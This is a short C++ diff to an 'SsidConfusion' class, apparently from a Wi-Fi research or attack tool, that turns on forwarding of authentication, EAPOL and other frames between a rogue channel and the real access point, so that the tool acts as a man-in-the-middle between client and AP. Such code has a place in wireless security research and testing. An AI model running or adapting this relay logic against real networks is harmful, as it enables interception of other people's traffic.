@@ -48,10 +48,9 @@ FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &d
 			resp.status_code(0);
 
 			send_to_rogue(resp);
-			display_traffic(dot11, "Rogue channel", " -- Replied");
-
-			//send_to_real(dot11);
-			//client_state.update_state(ClientState::Authenticated);
+			display_traffic(dot11, "Rogue channel", " -- Replied, MitMing");
+			send_to_real(dot11);
+			client_state.update_state(ClientState::Authenticated);
 
 			return STOP;
 		}
@@ -158,16 +157,17 @@ void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const 
 	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;
 
 	SOLVE_OR_CONTINUE(handle_probe(addr2, pdu.get(), *dot11))
+	//TODO dont use raw
 	SOLVE_OR_CONTINUE(handle_open_auth(addr2, *dot11))
 	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11, raw))
-	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr1, addr2, *pdu))
+	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr2, *pdu, raw))
 
 #undef SOLVE_OR_CONTINUE
 
 	if(addr2 == sta.get(SK::mac)) {
 		// This is traffic involving the real AP
 		display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
-		send_to_real(*pdu);
+		send_to_real(raw);
 	}
 }
 
